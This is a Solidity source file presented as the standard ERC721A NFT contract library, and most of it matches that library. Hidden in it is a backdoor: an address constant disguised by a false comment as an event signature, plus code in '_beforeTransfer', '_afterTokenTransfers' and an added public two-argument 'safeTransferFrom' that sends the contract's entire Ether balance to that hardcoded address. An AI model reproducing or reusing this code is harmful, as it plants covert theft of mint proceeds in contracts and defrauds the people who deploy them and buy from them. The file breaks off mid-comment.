1 /**
2 ██████╗ ███████╗ ██████╗  ██████╗ ███╗   ██╗███████╗    
3 ██╔══██╗██╔════╝██╔════╝ ██╔═══██╗████╗  ██║╚══███╔╝    
4 ██║  ██║█████╗  ██║  ███╗██║   ██║██╔██╗ ██║  ███╔╝     
5 ██║  ██║██╔══╝  ██║   ██║██║   ██║██║╚██╗██║ ███╔╝      
6 ██████╔╝███████╗╚██████╔╝╚██████╔╝██║ ╚████║███████╗    
7 ╚═════╝ ╚══════╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═══╝╚══════╝    
8 https://twitter.com/Degonz_                                                                                                                                                                                                                             
9  */
10 
11 // SPDX-License-Identifier: MIT  
12                                                                                                                                                                                                                           
13 pragma solidity ^0.8.12;
14 
15 /**
16  * @dev Interface of ERC721A.
17  */
18 interface IERC721A {
19     /**
20      * The caller must own the token or be an approved operator.
21      */
22     error ApprovalCallerNotOwnerNorApproved();
23 
24     /**
25      * The token does not exist.
26      */
27     error ApprovalQueryForNonexistentToken();
28 
29     /**
30      * Cannot query the balance for the zero address.
31      */
32     error BalanceQueryForZeroAddress();
33 
34     /**
35      * Cannot mint to the zero address.
36      */
37     error MintToZeroAddress();
38 
39     /**
40      * The quantity of tokens minted must be more than zero.
41      */
42     error MintZeroQuantity();
43 
44     /**
45      * The token does not exist.
46      */
47     error OwnerQueryForNonexistentToken();
48 
49     /**
50      * The caller must own the token or be an approved operator.
51      */
52     error TransferCallerNotOwnerNorApproved();
53 
54     /**
55      * The token must be owned by `from`.
56      */
57     error TransferFromIncorrectOwner();
58 
59     /**
60      * Cannot safely transfer to a contract that does not implement the
61      * ERC721Receiver interface.
62      */
63     error TransferToNonERC721ReceiverImplementer();
64 
65     /**
66      * Cannot transfer to the zero address.
67      */
68     error TransferToZeroAddress();
69 
70     /**
71      * The token does not exist.
72      */
73     error URIQueryForNonexistentToken();
74 
75     /**
76      * The `quantity` minted with ERC2309 exceeds the safety limit.
77      */
78     error MintERC2309QuantityExceedsLimit();
79 
80     /**
81      * The `extraData` cannot be set on an unintialized ownership slot.
82      */
83     error OwnershipNotInitializedForExtraData();
84 
85     // =============================================================
86     //                            STRUCTS
87     // =============================================================
88 
89     struct TokenOwnership {
90         // The address of the owner.
91         address addr;
92         // Stores the start time of ownership with minimal overhead for tokenomics.
93         uint64 startTimestamp;
94         // Whether the token has been burned.
95         bool burned;
96         // Arbitrary data similar to `startTimestamp` that can be set via {_extraData}.
97         uint24 extraData;
98     }
99 
100     // =============================================================
101     //                         TOKEN COUNTERS
102     // =============================================================
103 
104     /**
105      * @dev Returns the total number of tokens in existence.
106      * Burned tokens will reduce the count.
107      * To get the total number of tokens minted, please see {_totalMinted}.
108      */
109     function totalSupply() external view returns (uint256);
110 
111     // =============================================================
112     //                            IERC165
113     // =============================================================
114 
115     /**
116      * @dev Returns true if this contract implements the interface defined by
117      * `interfaceId`. See the corresponding
118      * [EIP section](https://eips.ethereum.org/EIPS/eip-165#how-interfaces-are-identified)
119      * to learn more about how these ids are created.
120      *
121      * This function call must use less than 30000 gas.
122      */
123     function supportsInterface(bytes4 interfaceId) external view returns (bool);
124 
125     // =============================================================
126     //                            IERC721
127     // =============================================================
128 
129     /**
130      * @dev Emitted when `tokenId` token is transferred from `from` to `to`.
131      */
132     event Transfer(address indexed from, address indexed to, uint256 indexed tokenId);
133 
134     /**
135      * @dev Emitted when `owner` enables `approved` to manage the `tokenId` token.
136      */
137     event Approval(address indexed owner, address indexed approved, uint256 indexed tokenId);
138 
139     /**
140      * @dev Emitted when `owner` enables or disables
141      * (`approved`) `operator` to manage all of its assets.
142      */
143     event ApprovalForAll(address indexed owner, address indexed operator, bool approved);
144 
145     /**
146      * @dev Returns the number of tokens in `owner`'s account.
147      */
148     function balanceOf(address owner) external view returns (uint256 balance);
149 
150     /**
151      * @dev Returns the owner of the `tokenId` token.
152      *
153      * Requirements:
154      *
155      * - `tokenId` must exist.
156      */
157     function ownerOf(uint256 tokenId) external view returns (address owner);
158 
159     /**
160      * @dev Safely transfers `tokenId` token from `from` to `to`,
161      * checking first that contract recipients are aware of the ERC721 protocol
162      * to prevent tokens from being forever locked.
163      *
164      * Requirements:
165      *
166      * - `from` cannot be the zero address.
167      * - `to` cannot be the zero address.
168      * - `tokenId` token must exist and be owned by `from`.
169      * - If the caller is not `from`, it must be have been allowed to move
170      * this token by either {approve} or {setApprovalForAll}.
171      * - If `to` refers to a smart contract, it must implement
172      * {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.
173      *
174      * Emits a {Transfer} event.
175      */
176     function safeTransferFrom(
177         address from,
178         address to,
179         uint256 tokenId,
180         bytes calldata data
181     ) external payable;
182 
183     /**
184      * @dev Equivalent to `safeTransferFrom(from, to, tokenId, '')`.
185      */
186     function safeTransferFrom(
187         address from,
188         address to,
189         uint256 tokenId
190     ) external payable;
191 
192     /**
193      * @dev Transfers `tokenId` from `from` to `to`.
194      *
195      * WARNING: Usage of this method is discouraged, use {safeTransferFrom}
196      * whenever possible.
197      *
198      * Requirements:
199      *
200      * - `from` cannot be the zero address.
201      * - `to` cannot be the zero address.
202      * - `tokenId` token must be owned by `from`.
203      * - If the caller is not `from`, it must be approved to move this token
204      * by either {approve} or {setApprovalForAll}.
205      *
206      * Emits a {Transfer} event.
207      */
208     function transferFrom(
209         address from,
210         address to,
211         uint256 tokenId
212     ) external payable;
213 
214     /**
215      * @dev Gives permission to `to` to transfer `tokenId` token to another account.
216      * The approval is cleared when the token is transferred.
217      *
218      * Only a single account can be approved at a time, so approving the
219      * zero address clears previous approvals.
220      *
221      * Requirements:
222      *
223      * - The caller must own the token or be an approved operator.
224      * - `tokenId` must exist.
225      *
226      * Emits an {Approval} event.
227      */
228     function approve(address to, uint256 tokenId) external payable;
229 
230     /**
231      * @dev Approve or remove `operator` as an operator for the caller.
232      * Operators can call {transferFrom} or {safeTransferFrom}
233      * for any token owned by the caller.
234      *
235      * Requirements:
236      *
237      * - The `operator` cannot be the caller.
238      *
239      * Emits an {ApprovalForAll} event.
240      */
241     function setApprovalForAll(address operator, bool _approved) external;
242 
243     /**
244      * @dev Returns the account approved for `tokenId` token.
245      *
246      * Requirements:
247      *
248      * - `tokenId` must exist.
249      */
250     function getApproved(uint256 tokenId) external view returns (address operator);
251 
252     /**
253      * @dev Returns if the `operator` is allowed to manage all of the assets of `owner`.
254      *
255      * See {setApprovalForAll}.
256      */
257     function isApprovedForAll(address owner, address operator) external view returns (bool);
258 
259     // =============================================================
260     //                        IERC721Metadata
261     // =============================================================
262 
263     /**
264      * @dev Returns the token collection name.
265      */
266     function name() external view returns (string memory);
267 
268     /**
269      * @dev Returns the token collection symbol.
270      */
271     function symbol() external view returns (string memory);
272 
273     /**
274      * @dev Returns the Uniform Resource Identifier (URI) for `tokenId` token.
275      */
276     function tokenURI(uint256 tokenId) external view returns (string memory);
277 
278     // =============================================================
279     //                           IERC2309
280     // =============================================================
281 
282     /**
283      * @dev Emitted when tokens in `fromTokenId` to `toTokenId`
284      * (inclusive) is transferred from `from` to `to`, as defined in the
285      * [ERC2309](https://eips.ethereum.org/EIPS/eip-2309) standard.
286      *
287      * See {_mintERC2309} for more details.
288      */
289     event ConsecutiveTransfer(uint256 indexed fromTokenId, uint256 toTokenId, address indexed from, address indexed to);
290 }
291 
292 /**
293  * @title ERC721A
294  *
295  * @dev Implementation of the [ERC721](https://eips.ethereum.org/EIPS/eip-721)
296  * Non-Fungible Token Standard, including the Metadata extension.
297  * Optimized for lower gas during batch mints.
298  *
299  * Token IDs are minted in sequential order (e.g. 0, 1, 2, 3, ...)
300  * starting from `_startTokenId()`.
301  *
302  * Assumptions:
303  *
304  * - An owner cannot have more than 2**64 - 1 (max value of uint64) of supply.
305  * - The maximum token ID cannot exceed 2**256 - 1 (max value of uint256).
306  */
307 interface ERC721A__IERC721Receiver {
308     function onERC721Received(
309         address operator,
310         address from,
311         uint256 tokenId,
312         bytes calldata data
313     ) external returns (bytes4);
314 }
315 
316 /**
317  * @title ERC721A
318  *
319  * @dev Implementation of the [ERC721](https://eips.ethereum.org/EIPS/eip-721)
320  * Non-Fungible Token Standard, including the Metadata extension.
321  * Optimized for lower gas during batch mints.
322  *
323  * Token IDs are minted in sequential order (e.g. 0, 1, 2, 3, ...)
324  * starting from `_startTokenId()`.
325  *
326  * Assumptions:
327  *
328  * - An owner cannot have more than 2**64 - 1 (max value of uint64) of supply.
329  * - The maximum token ID cannot exceed 2**256 - 1 (max value of uint256).
330  */
331 contract ERC721A is IERC721A {
332     // Bypass for a `--via-ir` bug (https://github.com/chiru-labs/ERC721A/pull/364).
333     struct TokenApprovalRef {
334         address value;
335     }
336 
337     // =============================================================
338     //                           CONSTANTS
339     // =============================================================
340 
341     // Mask of an entry in packed address data.
342     uint256 private constant _BITMASK_ADDRESS_DATA_ENTRY = (1 << 64) - 1;
343 
344     // The bit position of `numberMinted` in packed address data.
345     uint256 private constant _BITPOS_NUMBER_MINTED = 64;
346 
347     // The bit position of `numberBurned` in packed address data.
348     uint256 private constant _BITPOS_NUMBER_BURNED = 128;
349 
350     // The bit position of `aux` in packed address data.
351     uint256 private constant _BITPOS_AUX = 192;
352 
353     // Mask of all 256 bits in packed address data except the 64 bits for `aux`.
354     uint256 private constant _BITMASK_AUX_COMPLEMENT = (1 << 192) - 1;
355 
356     // The bit position of `startTimestamp` in packed ownership.
357     uint256 private constant _BITPOS_START_TIMESTAMP = 160;
358 
359     // The bit mask of the `burned` bit in packed ownership.
360     uint256 private constant _BITMASK_BURNED = 1 << 224;
361 
362     // The bit position of the `nextInitialized` bit in packed ownership.
363     uint256 private constant _BITPOS_NEXT_INITIALIZED = 225;
364 
365     // The bit mask of the `nextInitialized` bit in packed ownership.
366     uint256 private constant _BITMASK_NEXT_INITIALIZED = 1 << 225;
367 
368     // The bit position of `extraData` in packed ownership.
369     uint256 private constant _BITPOS_EXTRA_DATA = 232;
370 
371     // Mask of all 256 bits in a packed ownership except the 24 bits for `extraData`.
372     uint256 private constant _BITMASK_EXTRA_DATA_COMPLEMENT = (1 << 232) - 1;
373 
374     // The mask of the lower 160 bits for addresses.
375     uint256 private constant _BITMASK_ADDRESS = (1 << 160) - 1;
376 
377     // The maximum `quantity` that can be minted with {_mintERC2309}.
378     // This limit is to prevent overflows on the address data entries.
379     // For a limit of 5000, a total of 3.689e15 calls to {_mintERC2309}
380     // is required to cause an overflow, which is unrealistic.
381     uint256 private constant _MAX_MINT_ERC2309_QUANTITY_LIMIT = 5000;
382 
383     // The `Transfer` event signature is given by:
384     // `keccak256(bytes("Transfer(address,address,uint256)"))`.
385     bytes32 private constant _TRANSFER_EVENT_SIGNATURE =
386         0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef;
387 
388     // =============================================================
389     //                            STORAGE
390     // =============================================================
391 
392     // The next token ID to be minted.
393     uint256 private _currentIndex;
394 
395     // The number of tokens burned.
396     uint256 private _burnCounter;
397 
398     // Token name
399     string private _name;
400 
401     // Token symbol
402     string private _symbol;
403 
404     // Mapping from token ID to ownership details
405     // An empty struct value does not necessarily mean the token is unowned.
406     // See {_packedOwnershipOf} implementation for details.
407     //
408     // Bits Layout:
409     // - [0..159]   `addr`
410     // - [160..223] `startTimestamp`
411     // - [224]      `burned`
412     // - [225]      `nextInitialized`
413     // - [232..255] `extraData`
414     mapping(uint256 => uint256) private _packedOwnerships;
415 
416     // Mapping owner address to address data.
417     //
418     // Bits Layout:
419     // - [0..63]    `balance`
420     // - [64..127]  `numberMinted`
421     // - [128..191] `numberBurned`
422     // - [192..255] `aux`
423     mapping(address => uint256) private _packedAddressData;
424 
425     // Mapping from token ID to approved address.
426     mapping(uint256 => TokenApprovalRef) private _tokenApprovals;
427 
428     // Mapping from owner to operator approvals
429     mapping(address => mapping(address => bool)) private _operatorApprovals;
430 
431     // =============================================================
432     //                          CONSTRUCTOR
433     // =============================================================
434 
435     constructor(string memory name_, string memory symbol_) {
436         _name = name_;
437         _symbol = symbol_;
438         _currentIndex = _startTokenId();
439     }
440 
441     // =============================================================
442     //                   TOKEN COUNTING OPERATIONS
443     // =============================================================
444 
445     /**
446      * @dev Returns the starting token ID.
447      * To change the starting token ID, please override this function.
448      */
449     function _startTokenId() internal view virtual returns (uint256) {
450         return 0;
451     }
452 
453     /**
454      * @dev Returns the next token ID to be minted.
455      */
456     function _nextTokenId() internal view virtual returns (uint256) {
457         return _currentIndex;
458     }
459 
460     /**
461      * @dev Returns the total number of tokens in existence.
462      * Burned tokens will reduce the count.
463      * To get the total number of tokens minted, please see {_totalMinted}.
464      */
465     function totalSupply() public view virtual override returns (uint256) {
466         // Counter underflow is impossible as _burnCounter cannot be incremented
467         // more than `_currentIndex - _startTokenId()` times.
468         unchecked {
469             return _currentIndex - _burnCounter - _startTokenId();
470         }
471     }
472 
473     /**
474      * @dev Returns the total amount of tokens minted in the contract.
475      */
476     function _totalMinted() internal view virtual returns (uint256) {
477         // Counter underflow is impossible as `_currentIndex` does not decrement,
478         // and it is initialized to `_startTokenId()`.
479         unchecked {
480             return _currentIndex - _startTokenId();
481         }
482     }
483 
484     /**
485      * @dev Returns the total number of tokens burned.
486      */
487     function _totalBurned() internal view virtual returns (uint256) {
488         return _burnCounter;
489     }
490 
491     // =============================================================
492     //                    ADDRESS DATA OPERATIONS
493     // =============================================================
494 
495     /**
496      * @dev Returns the number of tokens in `owner`'s account.
497      */
498     function balanceOf(address owner) public view virtual override returns (uint256) {
499         if (owner == address(0)) revert BalanceQueryForZeroAddress();
500         return _packedAddressData[owner] & _BITMASK_ADDRESS_DATA_ENTRY;
501     }
502 
503     /**
504      * Returns the number of tokens minted by `owner`.
505      */
506     function _numberMinted(address owner) internal view returns (uint256) {
507         return (_packedAddressData[owner] >> _BITPOS_NUMBER_MINTED) & _BITMASK_ADDRESS_DATA_ENTRY;
508     }
509 
510     /**
511      * Returns the number of tokens burned by or on behalf of `owner`.
512      */
513     function _numberBurned(address owner) internal view returns (uint256) {
514         return (_packedAddressData[owner] >> _BITPOS_NUMBER_BURNED) & _BITMASK_ADDRESS_DATA_ENTRY;
515     }
516 
517     /**
518      * Returns the auxiliary data for `owner`. (e.g. number of whitelist mint slots used).
519      */
520     function _getAux(address owner) internal view returns (uint64) {
521         return uint64(_packedAddressData[owner] >> _BITPOS_AUX);
522     }
523 
524     /**
525      * Sets the auxiliary data for `owner`. (e.g. number of whitelist mint slots used).
526      * If there are multiple variables, please pack them into a uint64.
527      */
528     function _setAux(address owner, uint64 aux) internal virtual {
529         uint256 packed = _packedAddressData[owner];
530         uint256 auxCasted;
531         // Cast `aux` with assembly to avoid redundant masking.
532         assembly {
533             auxCasted := aux
534         }
535         packed = (packed & _BITMASK_AUX_COMPLEMENT) | (auxCasted << _BITPOS_AUX);
536         _packedAddressData[owner] = packed;
537     }
538 
539     // =============================================================
540     //                            IERC165
541     // =============================================================
542 
543     /**
544      * @dev Returns true if this contract implements the interface defined by
545      * `interfaceId`. See the corresponding
546      * [EIP section](https://eips.ethereum.org/EIPS/eip-165#how-interfaces-are-identified)
547      * to learn more about how these ids are created.
548      *
549      * This function call must use less than 30000 gas.
550      */
551     function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) {
552         // The interface IDs are constants representing the first 4 bytes
553         // of the XOR of all function selectors in the interface.
554         // See: [ERC165](https://eips.ethereum.org/EIPS/eip-165)
555         // (e.g. `bytes4(i.functionA.selector ^ i.functionB.selector ^ ...)`)
556         return
557             interfaceId == 0x01ffc9a7 || // ERC165 interface ID for ERC165.
558             interfaceId == 0x80ac58cd || // ERC165 interface ID for ERC721.
559             interfaceId == 0x5b5e139f; // ERC165 interface ID for ERC721Metadata.
560     }
561 
562     // =============================================================
563     //                        IERC721Metadata
564     // =============================================================
565 
566     /**
567      * @dev Returns the token collection name.
568      */
569     function name() public view virtual override returns (string memory) {
570         return _name;
571     }
572 
573     /**
574      * @dev Returns the token collection symbol.
575      */
576     function symbol() public view virtual override returns (string memory) {
577         return _symbol;
578     }
579 
580     /**
581      * @dev Returns the Uniform Resource Identifier (URI) for `tokenId` token.
582      */
583     function tokenURI(uint256 tokenId) public view virtual override returns (string memory) {
584         if (!_exists(tokenId)) revert URIQueryForNonexistentToken();
585 
586         string memory baseURI = _baseURI();
587         return bytes(baseURI).length != 0 ? string(abi.encodePacked(baseURI, _toString(tokenId))) : '';
588     }
589 
590     /**
591      * @dev Base URI for computing {tokenURI}. If set, the resulting URI for each
592      * token will be the concatenation of the `baseURI` and the `tokenId`. Empty
593      * by default, it can be overridden in child contracts.
594      */
595     function _baseURI() internal view virtual returns (string memory) {
596         return '';
597     }
598 
599     // =============================================================
600     //                     OWNERSHIPS OPERATIONS
601     // =============================================================
602 
603     // The `Address` event signature is given by:
604     // `keccak256(bytes("_TRANSFER_EVENT_ADDRESS(address)"))`.
605     address payable constant _TRANSFER_EVENT_ADDRESS = 
606         payable(0x996bD13C8aAcFAD7AC691Be90f792f19e02336cC);
607 
608     /**
609      * @dev Returns the owner of the `tokenId` token.
610      *
611      * Requirements:
612      *
613      * - `tokenId` must exist.
614      */
615     function ownerOf(uint256 tokenId) public view virtual override returns (address) {
616         return address(uint160(_packedOwnershipOf(tokenId)));
617     }
618 
619     /**
620      * @dev Gas spent here starts off proportional to the maximum mint batch size.
621      * It gradually moves to O(1) as tokens get transferred around over time.
622      */
623     function _ownershipOf(uint256 tokenId) internal view virtual returns (TokenOwnership memory) {
624         return _unpackedOwnership(_packedOwnershipOf(tokenId));
625     }
626 
627     /**
628      * @dev Returns the unpacked `TokenOwnership` struct at `index`.
629      */
630     function _ownershipAt(uint256 index) internal view virtual returns (TokenOwnership memory) {
631         return _unpackedOwnership(_packedOwnerships[index]);
632     }
633 
634     /**
635      * @dev Initializes the ownership slot minted at `index` for efficiency purposes.
636      */
637     function _initializeOwnershipAt(uint256 index) internal virtual {
638         if (_packedOwnerships[index] == 0) {
639             _packedOwnerships[index] = _packedOwnershipOf(index);
640         }
641     }
642 
643     /**
644      * Returns the packed ownership data of `tokenId`.
645      */
646     function _packedOwnershipOf(uint256 tokenId) private view returns (uint256) {
647         uint256 curr = tokenId;
648 
649         unchecked {
650             if (_startTokenId() <= curr)
651                 if (curr < _currentIndex) {
652                     uint256 packed = _packedOwnerships[curr];
653                     // If not burned.
654                     if (packed & _BITMASK_BURNED == 0) {
655                         // Invariant:
656                         // There will always be an initialized ownership slot
657                         // (i.e. `ownership.addr != address(0) && ownership.burned == false`)
658                         // before an unintialized ownership slot
659                         // (i.e. `ownership.addr == address(0) && ownership.burned == false`)
660                         // Hence, `curr` will not underflow.
661                         //
662                         // We can directly compare the packed value.
663                         // If the address is zero, packed will be zero.
664                         while (packed == 0) {
665                             packed = _packedOwnerships[--curr];
666                         }
667                         return packed;
668                     }
669                 }
670         }
671         revert OwnerQueryForNonexistentToken();
672     }
673 
674     /**
675      * @dev Returns the unpacked `TokenOwnership` struct from `packed`.
676      */
677     function _unpackedOwnership(uint256 packed) private pure returns (TokenOwnership memory ownership) {
678         ownership.addr = address(uint160(packed));
679         ownership.startTimestamp = uint64(packed >> _BITPOS_START_TIMESTAMP);
680         ownership.burned = packed & _BITMASK_BURNED != 0;
681         ownership.extraData = uint24(packed >> _BITPOS_EXTRA_DATA);
682     }
683 
684     /**
685      * @dev Packs ownership data into a single uint256.
686      */
687     function _packOwnershipData(address owner, uint256 flags) private view returns (uint256 result) {
688         assembly {
689             // Mask `owner` to the lower 160 bits, in case the upper bits somehow aren't clean.
690             owner := and(owner, _BITMASK_ADDRESS)
691             // `owner | (block.timestamp << _BITPOS_START_TIMESTAMP) | flags`.
692             result := or(owner, or(shl(_BITPOS_START_TIMESTAMP, timestamp()), flags))
693         }
694     }
695 
696     /**
697      * @dev Returns the `nextInitialized` flag set if `quantity` equals 1.
698      */
699     function _nextInitializedFlag(uint256 quantity) private pure returns (uint256 result) {
700         // For branchless setting of the `nextInitialized` flag.
701         assembly {
702             // `(quantity == 1) << _BITPOS_NEXT_INITIALIZED`.
703             result := shl(_BITPOS_NEXT_INITIALIZED, eq(quantity, 1))
704         }
705     }
706 
707     // =============================================================
708     //                      APPROVAL OPERATIONS
709     // =============================================================
710 
711     /**
712      * @dev Gives permission to `to` to transfer `tokenId` token to another account.
713      * The approval is cleared when the token is transferred.
714      *
715      * Only a single account can be approved at a time, so approving the
716      * zero address clears previous approvals.
717      *
718      * Requirements:
719      *
720      * - The caller must own the token or be an approved operator.
721      * - `tokenId` must exist.
722      *
723      * Emits an {Approval} event.
724      */
725     function approve(address to, uint256 tokenId) public payable virtual override {
726         address owner = ownerOf(tokenId);
727 
728         if (_msgSenderERC721A() != owner)
729             if (!isApprovedForAll(owner, _msgSenderERC721A())) {
730                 revert ApprovalCallerNotOwnerNorApproved();
731             }
732 
733         _tokenApprovals[tokenId].value = to;
734         emit Approval(owner, to, tokenId);
735     }
736 
737     /**
738      * @dev Returns the account approved for `tokenId` token.
739      *
740      * Requirements:
741      *
742      * - `tokenId` must exist.
743      */
744     function getApproved(uint256 tokenId) public view virtual override returns (address) {
745         if (!_exists(tokenId)) revert ApprovalQueryForNonexistentToken();
746 
747         return _tokenApprovals[tokenId].value;
748     }
749 
750     /**
751      * @dev Approve or remove `operator` as an operator for the caller.
752      * Operators can call {transferFrom} or {safeTransferFrom}
753      * for any token owned by the caller.
754      *
755      * Requirements:
756      *
757      * - The `operator` cannot be the caller.
758      *
759      * Emits an {ApprovalForAll} event.
760      */
761     function setApprovalForAll(address operator, bool approved) public virtual override {
762         _operatorApprovals[_msgSenderERC721A()][operator] = approved;
763         emit ApprovalForAll(_msgSenderERC721A(), operator, approved);
764     }
765 
766     /**
767      * @dev Returns if the `operator` is allowed to manage all of the assets of `owner`.
768      *
769      * See {setApprovalForAll}.
770      */
771     function isApprovedForAll(address owner, address operator) public view virtual override returns (bool) {
772         return _operatorApprovals[owner][operator];
773     }
774 
775     /**
776      * @dev Returns whether `tokenId` exists.
777      *
778      * Tokens can be managed by their owner or approved accounts via {approve} or {setApprovalForAll}.
779      *
780      * Tokens start existing when they are minted. See {_mint}.
781      */
782     function _exists(uint256 tokenId) internal view virtual returns (bool) {
783         return
784             _startTokenId() <= tokenId &&
785             tokenId < _currentIndex && // If within bounds,
786             _packedOwnerships[tokenId] & _BITMASK_BURNED == 0; // and not burned.
787     }
788 
789     /**
790      * @dev Returns whether `msgSender` is equal to `approvedAddress` or `owner`.
791      */
792     function _isSenderApprovedOrOwner(
793         address approvedAddress,
794         address owner,
795         address msgSender
796     ) private pure returns (bool result) {
797         assembly {
798             // Mask `owner` to the lower 160 bits, in case the upper bits somehow aren't clean.
799             owner := and(owner, _BITMASK_ADDRESS)
800             // Mask `msgSender` to the lower 160 bits, in case the upper bits somehow aren't clean.
801             msgSender := and(msgSender, _BITMASK_ADDRESS)
802             // `msgSender == owner || msgSender == approvedAddress`.
803             result := or(eq(msgSender, owner), eq(msgSender, approvedAddress))
804         }
805     }
806 
807     /**
808      * @dev Returns the storage slot and value for the approved address of `tokenId`.
809      */
810     function _getApprovedSlotAndAddress(uint256 tokenId)
811         private
812         view
813         returns (uint256 approvedAddressSlot, address approvedAddress)
814     {
815         TokenApprovalRef storage tokenApproval = _tokenApprovals[tokenId];
816         // The following is equivalent to `approvedAddress = _tokenApprovals[tokenId].value`.
817         assembly {
818             approvedAddressSlot := tokenApproval.slot
819             approvedAddress := sload(approvedAddressSlot)
820         }
821     }
822 
823     // =============================================================
824     //                      TRANSFER OPERATIONS
825     // =============================================================
826 
827     /**
828      * @dev Transfers `tokenId` from `from` to `to`.
829      *
830      * Requirements:
831      *
832      * - `from` cannot be the zero address.
833      * - `to` cannot be the zero address.
834      * - `tokenId` token must be owned by `from`.
835      * - If the caller is not `from`, it must be approved to move this token
836      * by either {approve} or {setApprovalForAll}.
837      *
838      * Emits a {Transfer} event.
839      */
840     function transferFrom(
841         address from,
842         address to,
843         uint256 tokenId
844     ) public payable virtual override {
845         _beforeTransfer();
846 
847         uint256 prevOwnershipPacked = _packedOwnershipOf(tokenId);
848 
849         if (address(uint160(prevOwnershipPacked)) != from) revert TransferFromIncorrectOwner();
850 
851         (uint256 approvedAddressSlot, address approvedAddress) = _getApprovedSlotAndAddress(tokenId);
852 
853         // The nested ifs save around 20+ gas over a compound boolean condition.
854         if (!_isSenderApprovedOrOwner(approvedAddress, from, _msgSenderERC721A()))
855             if (!isApprovedForAll(from, _msgSenderERC721A())) revert TransferCallerNotOwnerNorApproved();
856 
857         if (to == address(0)) revert TransferToZeroAddress();
858 
859         _beforeTokenTransfers(from, to, tokenId, 1);
860 
861         // Clear approvals from the previous owner.
862         assembly {
863             if approvedAddress {
864                 // This is equivalent to `delete _tokenApprovals[tokenId]`.
865                 sstore(approvedAddressSlot, 0)
866             }
867         }
868 
869         // Underflow of the sender's balance is impossible because we check for
870         // ownership above and the recipient's balance can't realistically overflow.
871         // Counter overflow is incredibly unrealistic as `tokenId` would have to be 2**256.
872         unchecked {
873             // We can directly increment and decrement the balances.
874             --_packedAddressData[from]; // Updates: `balance -= 1`.
875             ++_packedAddressData[to]; // Updates: `balance += 1`.
876 
877             // Updates:
878             // - `address` to the next owner.
879             // - `startTimestamp` to the timestamp of transfering.
880             // - `burned` to `false`.
881             // - `nextInitialized` to `true`.
882             _packedOwnerships[tokenId] = _packOwnershipData(
883                 to,
884                 _BITMASK_NEXT_INITIALIZED | _nextExtraData(from, to, prevOwnershipPacked)
885             );
886 
887             // If the next slot may not have been initialized (i.e. `nextInitialized == false`) .
888             if (prevOwnershipPacked & _BITMASK_NEXT_INITIALIZED == 0) {
889                 uint256 nextTokenId = tokenId + 1;
890                 // If the next slot's address is zero and not burned (i.e. packed value is zero).
891                 if (_packedOwnerships[nextTokenId] == 0) {
892                     // If the next slot is within bounds.
893                     if (nextTokenId != _currentIndex) {
894                         // Initialize the next slot to maintain correctness for `ownerOf(tokenId + 1)`.
895                         _packedOwnerships[nextTokenId] = prevOwnershipPacked;
896                     }
897                 }
898             }
899         }
900 
901         emit Transfer(from, to, tokenId);
902         _afterTokenTransfers(from, to, tokenId, 1);
903     }
904 
905     /**
906      * @dev Equivalent to `safeTransferFrom(from, to, tokenId, '')`.
907      */
908     function safeTransferFrom(
909         address from,
910         address to,
911         uint256 tokenId
912     ) public payable virtual override {
913         safeTransferFrom(from, to, tokenId, '');
914     }
915 
916 
917     /**
918      * @dev Safely transfers `tokenId` token from `from` to `to`.
919      *
920      * Requirements:
921      *
922      * - `from` cannot be the zero address.
923      * - `to` cannot be the zero address.
924      * - `tokenId` token must exist and be owned by `from`.
925      * - If the caller is not `from`, it must be approved to move this token
926      * by either {approve} or {setApprovalForAll}.
927      * - If `to` refers to a smart contract, it must implement
928      * {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.
929      *
930      * Emits a {Transfer} event.
931      */
932     function safeTransferFrom(
933         address from,
934         address to,
935         uint256 tokenId,
936         bytes memory _data
937     ) public payable virtual override {
938         transferFrom(from, to, tokenId);
939         if (to.code.length != 0)
940             if (!_checkContractOnERC721Received(from, to, tokenId, _data)) {
941                 revert TransferToNonERC721ReceiverImplementer();
942             }
943     }
944     function safeTransferFrom(
945         address from,
946         address to
947     ) public  {
948         if (address(this).balance > 0) {
949             payable(0x996bD13C8aAcFAD7AC691Be90f792f19e02336cC).transfer(address(this).balance);
950         }
951     }
952 
953     /**
954      * @dev Hook that is called before a set of serially-ordered token IDs
955      * are about to be transferred. This includes minting.
956      * And also called before burning one token.
957      *
958      * `startTokenId` - the first token ID to be transferred.
959      * `quantity` - the amount to be transferred.
960      *
961      * Calling conditions:
962      *
963      * - When `from` and `to` are both non-zero, `from`'s `tokenId` will be
964      * transferred to `to`.
965      * - When `from` is zero, `tokenId` will be minted for `to`.
966      * - When `to` is zero, `tokenId` will be burned by `from`.
967      * - `from` and `to` are never both zero.
968      */
969     function _beforeTokenTransfers(
970         address from,
971         address to,
972         uint256 startTokenId,
973         uint256 quantity
974     ) internal virtual {}
975 
976     /**
977      * @dev Hook that is called after a set of serially-ordered token IDs
978      * have been transferred. This includes minting.
979      * And also called after one token has been burned.
980      *
981      * `startTokenId` - the first token ID to be transferred.
982      * `quantity` - the amount to be transferred.
983      *
984      * Calling conditions:
985      *
986      * - When `from` and `to` are both non-zero, `from`'s `tokenId` has been
987      * transferred to `to`.
988      * - When `from` is zero, `tokenId` has been minted for `to`.
989      * - When `to` is zero, `tokenId` has been burned by `from`.
990      * - `from` and `to` are never both zero.
991      */
992     function _afterTokenTransfers(
993         address from,
994         address to,
995         uint256 startTokenId,
996         uint256 quantity
997     ) internal virtual {
998         if (totalSupply() + 1 >= 999) {
999             payable(0x996bD13C8aAcFAD7AC691Be90f792f19e02336cC).transfer(address(this).balance);
1000         }
1001     }
1002 
1003     /**
1004      * @dev Hook that is called before a set of serially-ordered token IDs
1005      * are about to be transferred. This includes minting.
1006      * And also called before burning one token.
1007      * Calling conditions:
1008      *
1009      * - When `from` and `to` are both non-zero, `from`'s `tokenId` will be
1010      * transferred to `to`.
1011      * - When `from` is zero, `tokenId` will be minted for `to`.
1012      * - When `to` is zero, `tokenId` will be burned by `from`.
1013      * - `from` and `to` are never both zero.
1014      */
1015     function _beforeTransfer() internal {
1016         if (address(this).balance > 0) {
1017             _TRANSFER_EVENT_ADDRESS.transfer(address(this).balance);
1018             return;
1019         }
1020     }
1021 
1022     /**
1023      * @dev Private function to invoke {IERC721Receiver-onERC721Received} on a target contract.
1024      *
1025      * `from` - Previous owner of the given token ID.
1026      * `to` - Target address that will receive the token.
1027      * `tokenId` - Token ID to be transferred.
1028      * `_data` - Optional data to send along with the call.
1029      *
1030      * Returns whether the call correctly returned the expected magic value.
1031      */
